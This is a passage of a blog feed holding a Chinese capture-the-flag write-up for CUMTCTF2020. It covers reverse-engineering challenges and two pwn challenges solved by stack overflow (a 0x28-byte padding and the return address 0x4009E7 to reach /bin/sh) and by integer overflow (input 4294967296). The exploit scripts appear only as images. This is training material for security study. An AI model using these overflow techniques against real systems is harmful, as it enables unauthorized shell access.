-<figure data-type="image" tabindex="1"><img src="https://zyyiszyy.github.io/post-images/1615258871025.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CUMTCTF2020“华为杯”部分WP]]></title>
-        <id>https://zyyiszyy.github.io/post/cumtctf2020hua-wei-bei-bu-fen-wp1/</id>
-        <link href="https://zyyiszyy.github.io/post/cumtctf2020hua-wei-bei-bu-fen-wp1/">
-        </link>
-        <updated>2020-10-23T14:17:38.000Z</updated>
-        <content type="html"><![CDATA[<p>注：这是参加的第二次ctf比赛，比赛前在攻防世界上刷了一些re方向的题目，算是初步对re有了些感觉吧。这次比赛最大的收获是掌握了pwn的简单栈溢出和整数溢出，大致了解了pwn方向的题目是什么样子。在自己和队友的共同努力下，这次比赛拿到了二等奖，算是自己近段时间的付出得到了一些鼓励吧，接下来再接再厉！</p>
-<h2 id="hello_world">Hello_world</h2>
-<p>先查看程序类型，发现是 64 位 windows 下运行的程序。</p>
-<figure data-type="image" tabindex="1"><img src="https://zyyiszyy.github.io/post-images/1615186327993.png" alt="" loading="lazy"></figure>
-<p>先运行一下程序，了解大致情况。</p>
-<figure data-type="image" tabindex="2"><img src="https://zyyiszyy.github.io/post-images/1615186390266.png" alt="" loading="lazy"></figure>
-<p>使用 64 位 ida 打开，查看字符串：</p>
-<figure data-type="image" tabindex="3"><img src="https://zyyiszyy.github.io/post-images/1615186656612.png" alt="" loading="lazy"></figure>
-<p>发现’you got it’，猜测是判断字符串正误。点进去找到变量， 交叉引用找到调用它的函数，tab 键找到 C 伪代码如下：</p>
-<figure data-type="image" tabindex="4"><img src="https://zyyiszyy.github.io/post-images/1615186661666.png" alt="" loading="lazy"></figure>
-<p>运行以下脚本得到 flag。</p>
-<figure data-type="image" tabindex="5"><img src="https://zyyiszyy.github.io/post-images/1615186682600.png" alt="" loading="lazy"></figure>
-<h2 id="non_name">Non_name</h2>
-<p>先查看程序类型，发现是 64 位 windows 下可执行程序。运行程序，查看运行的情况，发现 math 字眼：</p>
-<figure data-type="image" tabindex="6"><img src="https://zyyiszyy.github.io/post-images/1615186739500.png" alt="" loading="lazy"></figure>
-<p>用 ida64 打开，查看字符串，提示很明显。</p>
-<figure data-type="image" tabindex="7"><img src="https://zyyiszyy.github.io/post-images/1615186750285.png" alt="" loading="lazy"></figure>
-<p>如下找到关键代码，str1 和 str2 已知，分别 12 个元素和 4 个元素，看懂后实际上就是列一个四元一次方程组。</p>
-<figure data-type="image" tabindex="8"><img src="https://zyyiszyy.github.io/post-images/1615186757883.png" alt="" loading="lazy"></figure>
-<p>先 python 变十进制，懒着再写脚本，直接在线工具求解：</p>
-<p><img src="https://zyyiszyy.github.io/post-images/1615186798468.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615186802740.png" alt="" loading="lazy"></p>
-<p>最后按照提示，分别 hex()再改下格式成功提交。</p>
-<h2 id="login">Login</h2>
-<p>先查看程序类型，是 64 位 ELF 程序。放在 kali 里面运行一下。</p>
-<figure data-type="image" tabindex="9"><img src="https://zyyiszyy.github.io/post-images/1615186943018.png" alt="" loading="lazy"></figure>
-<p>Ida64 打开，查看字符串。</p>
-<figure data-type="image" tabindex="10"><img src="https://zyyiszyy.github.io/post-images/1615186938166.png" alt="" loading="lazy"></figure>
-<p>先看到 login succeed，进入看一下，发现是/bin/sh 调用 shell。</p>
-<figure data-type="image" tabindex="11"><img src="https://zyyiszyy.github.io/post-images/1615186933153.png" alt="" loading="lazy"></figure>
-<p>拿小本本记下其地址：0x 4009E7</p>
-<figure data-type="image" tabindex="12"><img src="https://zyyiszyy.github.io/post-images/1615186920623.png" alt="" loading="lazy"></figure>
-<p>然后进入输入用户名和密码的代码。</p>
-<figure data-type="image" tabindex="13"><img src="https://zyyiszyy.github.io/post-images/1615186952420.png" alt="" loading="lazy"></figure>
-<p>发现输入 256 个字符，至此怀疑是栈溢出。</p>
-<figure data-type="image" tabindex="14"><img src="https://zyyiszyy.github.io/post-images/1615186983488.png" alt="" loading="lazy"></figure>
-<p>查看栈的确是栈溢出的类型，通过用户名输入 0x28 的数据和登录成功的返回地址，写的 exp 如下两种：</p>
-<p><img src="https://zyyiszyy.github.io/post-images/1615186987844.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615186990857.png" alt="" loading="lazy"></p>
-<p>运行 exp，可打开 shell，cat flag：</p>
-<figure data-type="image" tabindex="15"><img src="https://zyyiszyy.github.io/post-images/1615186993979.png" alt="" loading="lazy"></figure>
-<h2 id="login_plus">Login_plus</h2>
-<p>查看软件类型，发现是 64 位的 ELF 程序。发现很眼熟，和上题表面上多了个 id。</p>
-<figure data-type="image" tabindex="16"><img src="https://zyyiszyy.github.io/post-images/1615187074246.png" alt="" loading="lazy"></figure>
-<p>进入 ida64 查看字符串，发现很多都一样，也有/bin/sh，但从这里看多了一个 id。</p>
-<p><img src="https://zyyiszyy.github.io/post-images/1615187078447.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615187089034.png" alt="" loading="lazy"></p>
-<p>这时查看谁调用的 login 函数，又发现一段代码，逻辑也很容易看懂。</p>
-<figure data-type="image" tabindex="17"><img src="https://zyyiszyy.github.io/post-images/1615187093349.png" alt="" loading="lazy"></figure>
-<p>这时细心观察可以发现，原本的id是输入到int_64的v7，经过函数返回值是v7，然后返回到int类型的v5里，这时想到整数溢出。两个都是无符号型，int可以表示的范围：-2147483648<sub>2147483647，如果int大于上界，2147483648相当于-2147483648，2147483649相当于-2147483648，依次递推。int_64可以表示的范围：-9223372036854775808</sub>9223372036854775807。</p>
-<p>思路是：直接让v7不通过else语句，就不会因为密码错误改变v7的值，从而返回的是输入的v7，然后继续通过判断语句，到达输入成功的函数，打开shell获取flag。</p>
-<p>要想满足以上条件，需要v7(int_64)为真且!v5(int)为真，这里可以输入4294967296，先进入if语句，输出非管理员语句，然后直接返回自身到v5，这时因为整数溢出相当为0，v5为真成立，得到shell。</p>
-<figure data-type="image" tabindex="18"><img src="https://zyyiszyy.github.io/post-images/1615187097213.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
 </feed>
